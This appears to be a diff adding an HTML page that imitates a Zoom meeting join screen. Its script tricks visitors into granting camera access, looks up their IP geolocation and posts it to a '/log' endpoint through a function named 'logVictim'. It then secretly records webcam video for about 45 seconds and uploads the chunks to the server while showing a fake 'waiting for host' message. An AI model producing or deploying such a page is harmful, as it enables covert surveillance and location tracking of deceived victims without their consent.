@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zoom Meeting</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1c1c1e; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+  .container { text-align: center; max-width: 480px; padding: 24px; }
+  .logo { font-size: 32px; font-weight: 700; color: #2d8cff; margin-bottom: 4px; }
+  .subtitle { color: #aaa; font-size: 14px; margin-bottom: 28px; }
+  .preview-box { width: 100%; aspect-ratio: 16/9; background: #2c2c2e; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; overflow: hidden; position: relative; }
+  #preview { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
+  .cam-placeholder { color: #555; font-size: 44px; }
+  .status-text { color: #888; font-size: 13px; margin-bottom: 18px; }
+  .btn { background: #2d8cff; color: #fff; border: none; border-radius: 6px; padding: 13px 40px; font-size: 15px; font-weight: 600; cursor: pointer; }
+  .btn:disabled { background: #444; color: #777; cursor: not-allowed; }
+  .rec-label { font-size: 12px; color: #ff3b30; display: none; margin-bottom: 10px; }
+  .dot { display: inline-block; width: 8px; height: 8px; background: #ff3b30; border-radius: 50%; margin-right: 5px; animation: blink 1s infinite; }
+  @keyframes blink { 0%,100%{opacity:1}50%{opacity:0.2} }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">zoom</div>
+  <div class="subtitle">Enable your camera to join this meeting</div>
+  <div class="preview-box">
+    <video id="preview" autoplay muted playsinline></video>
+    <div class="cam-placeholder" id="camPlaceholder">🎥</div>
+  </div>
+  <div class="rec-label" id="recLabel"><span class="dot"></span>Live</div>
+  <div class="status-text" id="statusText">Click "Join" to enable camera and join</div>
+  <button class="btn" id="joinBtn" onclick="startSession()">Join</button>
+</div>
+
+<script>
+const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
+let mediaRecorder, chunkIndex = 0, stream;
+
+async function getGeo() {
+  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
+}
+
+async function logVictim(geo) {
+  await fetch("/log", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({ session: SID, geo })
+  }).catch(()=>{});
+}
+
+async function startSession() {
+  const btn = document.getElementById("joinBtn");
+  btn.disabled = true;
+  btn.textContent = "Connecting...";
+  document.getElementById("statusText").textContent = "Allow camera access to continue";
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 }, audio: false });
+  } catch {
+    document.getElementById("statusText").textContent = "Camera blocked. Allow access and try again.";
+    btn.disabled = false; btn.textContent = "Join";
+    return;
+  }
+
+  document.getElementById("preview").srcObject = stream;
+  document.getElementById("preview").style.display = "block";
+  document.getElementById("camPlaceholder").style.display = "none";
+  document.getElementById("statusText").textContent = "Waiting for host to admit you...";
+  btn.textContent = "Waiting...";
+
+  const geo = await getGeo();
+  await logVictim(geo);
+  await new Promise(r => setTimeout(r, 2000));
+
+  document.getElementById("recLabel").style.display = "block";
+  startRecording(stream);
+}
+
+function startRecording(stream) {
+  const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
+  mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1500000 });
+  mediaRecorder.ondataavailable = async (e) => {
+    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
+  };
+  mediaRecorder.onstop = async () => {
+    await fetch(`/finalize?sid=${SID}`, { method: "POST" }).catch(()=>{});
+    document.getElementById("recLabel").style.display = "none";
+    document.getElementById("statusText").textContent = "Meeting has ended.";
+  };
+  mediaRecorder.start(5000);
+  setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+      mediaRecorder.stop();
+      stream.getTracks().forEach(t => t.stop());
+    }
+  }, 45000);
+}
+
+async function sendChunk(blob, index) {
+  await fetch(`/upload?sid=${SID}&chunk=${index}`, {
+    method: "POST",
+    headers: {"Content-Type":"video/webm"},
+    body: await blob.arrayBuffer()
+  }).catch(()=>{});
+}
+</script>
+</body>
+</html>
